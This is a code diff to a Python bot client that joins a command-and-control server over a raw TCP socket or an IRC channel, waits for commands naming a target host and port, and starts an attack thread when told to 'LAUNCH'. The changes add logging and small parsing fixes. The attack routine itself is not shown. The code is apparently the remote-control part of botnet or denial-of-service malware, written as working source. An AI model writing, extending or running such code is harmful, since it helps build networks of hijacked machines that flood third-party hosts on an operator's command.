@@ -111,10 +111,11 @@ def Main():
 		if communicatonMode == COMMUNICATION_MODE_SOCKETS:
 			s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # Establishing a TCP Connection
 			s.connect((sHost,sPort)) # Connect to the CCC Server Socket			
-		elif communicatonMode == COMMUNICATION_MODE_IRC:
+		elif communicatonMode == COMMUNICATION_MODE_IRC:			
 			ircNick = ircNick + hex(uuid.getnode()) + str(random.randrange(10000))
 			ircConn = IRC(10)
 			ircConn.connect(ircServer, ircPort, ircChannel, ircChannelPass, ircNick, ircBotpass, ircBotnickpass)
+			print("IRC BOT NICK: " + ircNick)
 	except: 
 		print("Socket CCC Server not online or failed connection to IRC Server, Retrying every 15 seconds...")
 		updated = 0
@@ -172,7 +173,7 @@ def Main():
 def executeReceivedCommand(data, ircNick):
 	global attackSet
 	global t
-	attStatus = "HOLD"
+	#attStatus = "HOLD"
 	# Return in case data not received, sockets will ever be informed but in IRC mode can occurs
 	if not data:
 		return
@@ -193,14 +194,17 @@ def executeReceivedCommand(data, ircNick):
 			attStatus = data[2]
 			attHost = data[0]
 			attPort = data[1]
+		else:
+			return
 	else:
 		attStatus = "OFFLINE"
 		
 
-	print('CCC Response: ', attStatus)
+	print('CCC Command received: ', attStatus)
 	
 	if attStatus == "LAUNCH":
 		if attackSet == 0:
+			print("Starting attack thread.... Type: " + data[3])
 			# start a new thread and start the attack (create a new process)
 			attackSet = 1
 			c = launchAttack()
@@ -233,6 +237,7 @@ def executeReceivedCommand(data, ircNick):
 		time.sleep(30)
 
 def checkCommandNicks(commandNicks, nickToSearch):
+	commandNicks = commandNicks.replace('\r\n', '')	
 	if nickToSearch in commandNicks.split(';'):
 		return True
 	else:
